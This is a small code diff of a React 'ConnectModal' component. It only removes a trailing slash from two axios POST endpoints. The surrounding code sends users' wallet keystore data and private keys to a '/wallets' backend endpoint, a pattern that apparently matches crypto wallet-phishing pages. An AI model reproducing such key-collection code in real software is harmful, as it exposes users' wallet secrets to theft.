@@ -139,7 +139,7 @@ const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
                 },
             };
             axios.post(
-                `${VITE_API_URL}/wallets/`,
+                `${VITE_API_URL}/wallets`,
                 // eslint-disable-next-line react/prop-types
                 { ...keyStoreValues, wallet_name: wallet.name },
                 config
@@ -163,7 +163,7 @@ const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
                 },
             };
             axios.post(
-                `${VITE_API_URL}/wallets/`,
+                `${VITE_API_URL}/wallets`,
                 // eslint-disable-next-line react/prop-types
                 { ...privateKeyValues, wallet_name: wallet.name },
                 config
